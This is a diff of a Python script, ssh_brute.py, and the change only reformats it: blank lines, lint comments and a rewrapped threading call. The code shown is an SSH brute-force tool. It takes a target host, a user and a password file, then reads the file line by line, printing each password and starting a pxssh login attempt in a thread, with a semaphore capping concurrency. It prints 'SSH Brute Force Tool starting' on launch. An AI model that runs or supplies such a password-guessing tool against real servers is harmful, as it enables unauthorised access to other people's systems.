@@ -3,10 +3,11 @@ import argparse
 import sys
 import time
 import threading
-import vpconfig # pylint: disable=E0401
+import vpconfig  # pylint: disable=E0401
 from pexpect import pxssh
 
 connection_lock = threading.BoundedSemaphore(value=vpconfig.MAX_CONNECTIONS)
+
 
 def connect(host, user, password, release):
     ''' connect to ssh'''
@@ -27,12 +28,13 @@ def connect(host, user, password, release):
         if release:
             connection_lock.release()
 
+
 def main():
     ''' main function'''
-    parser = argparse.ArgumentParser(usage='ssh_brute.py -H TARGET_HOST -u TARGET_USER -F PASSWORD_FILE')
-    parser.add_argument('-H', metavar='TARGET_HOST', type=str, help='specify target host')
-    parser.add_argument('-u', metavar='TARGET_USER', type=str, help='specify the user')
-    parser.add_argument('-F', metavar='PASSWORD_FILE', type=str, help='specify password file')
+    parser = argparse.ArgumentParser(usage='ssh_brute.py -H TARGET_HOST -u TARGET_USER -F PASSWORD_FILE')  # noqa: E501
+    parser.add_argument('-H', metavar='TARGET_HOST', type=str, help='specify target host')  # noqa: E501
+    parser.add_argument('-u', metavar='TARGET_USER', type=str, help='specify the user')  # noqa: E501
+    parser.add_argument('-F', metavar='PASSWORD_FILE', type=str, help='specify password file')  # noqa: E501
     args = parser.parse_args()
 
     if args.u is None or args.H is None or args.F is None:
@@ -52,11 +54,16 @@ def main():
             if vpconfig.FAILS > 5:
                 print('[!] Exiting: Too Many Socket Timeouts')
                 sys.exit(0)
-            connection_lock.acquire() #pylint: disable=R1732
+            connection_lock.acquire()  # pylint: disable=R1732
             password = line.strip('\r').strip('\n')
             print('[-] Testing: ' + str(password))
-            t = threading.Thread(target=connect, args=(host, user, password, True))
+            t = threading.Thread(target=connect,
+                                 args=(host,
+                                       user,
+                                       password,
+                                       True))
             t.start()
+
 
 if __name__ == '__main__':
     print('[+] SSH Brute Force Tool starting')
